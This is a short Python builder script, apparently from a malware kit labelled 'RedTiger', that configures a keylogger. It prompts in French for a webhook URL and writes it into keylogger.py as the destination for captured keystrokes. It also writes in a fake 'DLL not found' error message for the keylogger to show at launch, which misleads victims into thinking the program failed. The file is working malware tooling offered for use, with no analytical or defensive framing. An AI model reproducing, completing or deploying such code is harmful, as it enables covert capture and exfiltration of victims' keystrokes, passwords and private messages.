# Leak By RedTiger Teams

import os

KEYLOGGER_SCRIPT = 'keylogger.py'

def update_keylogger(webhook_url, msg):
    file_path = KEYLOGGER_SCRIPT
    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()
    for i, line in enumerate(lines):
        if line.strip().startswith("'WEBHOOK':"):
            lines[i] = "'WEBHOOK':" + f"'{webhook_url}'" + ',\n'
            break
    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)
    #######################################################
    for i, line in enumerate(lines):
        if line.strip().startswith("'msg':"):
            lines[i] = "'msg':" + f"'{msg}'" + ',\n'
            break
    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)
    #######################################################

def main():
    webhook_url = input("Entrez l'URL du webhook ").strip()
    msg = input('Entrez le message d\'erreur lors du lancement du keylogger \nexemple : the application failed to start because the the DLL file was no found.\n          Re-installing the application may fix this problem \n   >>')
    update_keylogger(webhook_url, msg)
    

if __name__ == '__main__':
    main()
